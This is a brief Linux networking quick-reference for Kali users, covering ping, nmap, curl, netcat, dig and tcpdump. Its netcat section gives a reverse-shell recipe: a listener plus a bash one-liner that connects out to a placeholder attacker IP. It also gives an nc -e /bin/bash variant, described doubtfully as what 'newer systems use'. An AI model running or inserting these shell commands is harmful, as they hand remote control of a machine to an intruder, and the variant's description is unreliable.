# **Networking Commands - Linux Quick Reference**
Recommended OS: Kali Linux

## Table of Contents
- [Network Utilities](#network-utilities)
- [Netcat Commands](#netcat-commands)
- [Network Troubleshooting](#network-troubleshooting)

---

## Network Utilities

- **`ping`**: Test connectivity to a host.  `ping <hostname or ip>`
- **`ifconfig`**: Display network info, like IP address.  `ifconfig`
- **`netstat`**: Show network connections and statistics.  `netstat -tuln`
- **`nmap`**: Scan network for hosts and open ports, for one ip, or a range.
  ex. `nmap <ip>` or `nmap 192.168.1.1-20` or `nmap 192.168.1.0/24`
- **`curl`**: Transfer data to and from a server (HTTP, FTP).  `curl http://example.com/file.zip`
- **`route`**: View or modify the routing table.  `route -n`
- **`mtr`**: Diagnostic tool combining ping and traceroute. `mtr <hostname or ip>`

---

## Netcat Commands

- **Listen on port**:  `nc -lvp 1234`
- **Connect to host**:  `nc <hostname or IP> 1234`
- **Scan for certain ports in a range**: `nc -zv <hostname> 1-100`
- **Send file**:  
  1. Receiver opens port and preps redirect:  `nc -l 12345 > received_file.txt`  
  2. Sender connects and redirects file to receiver ip:  `nc <receiver_ip> 12345 < my_file.txt`
- **Reverse Shell**:  
  1. Attacker opens port:  `nc -lvp 4444`  
  2. Victim connects and allows interactive shell for attacker:  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
  - Note: newer systems use `nc -l -p 1234 -e /bin/bash`  

---

## Network Troubleshooting

- **`dig`**: Query DNS.  `dig example.com`
- **`tcpdump`**: Capture network traffic.  `sudo tcpdump -i eth0` or `sudo tcpdump src host <ip>`
- **`hostname`**: Show or set hostname.  `hostname`

---

*Created by MD Harrell*  
For more info, visit the [Kali Linux Docs](https://www.kali.org/docs/).
